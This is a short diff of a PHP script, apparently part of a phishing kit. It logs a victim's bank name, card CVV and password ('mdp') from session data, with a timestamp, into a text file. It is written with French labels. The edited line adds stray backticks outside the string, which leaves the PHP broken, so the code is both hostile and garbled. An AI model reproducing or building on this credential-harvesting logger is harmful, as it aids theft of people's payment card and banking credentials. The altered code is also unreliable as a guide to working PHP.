@@ -14,7 +14,7 @@ $date = date("Y:m:d") ;
 $donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
 "\n"."heure :".$heure.
 "\n"."date :".$date.
-"\n". "Cvv : " .$_SESSION["cvv"] .
+"\n". "Cvv :  ```" .$_SESSION["cvv"] .```
 "\n"."Mdp : " .$_SESSION["mdp"] .
 "\n";
 $file = "../blinky2000@bvc@bvc@destruction.txt" ;
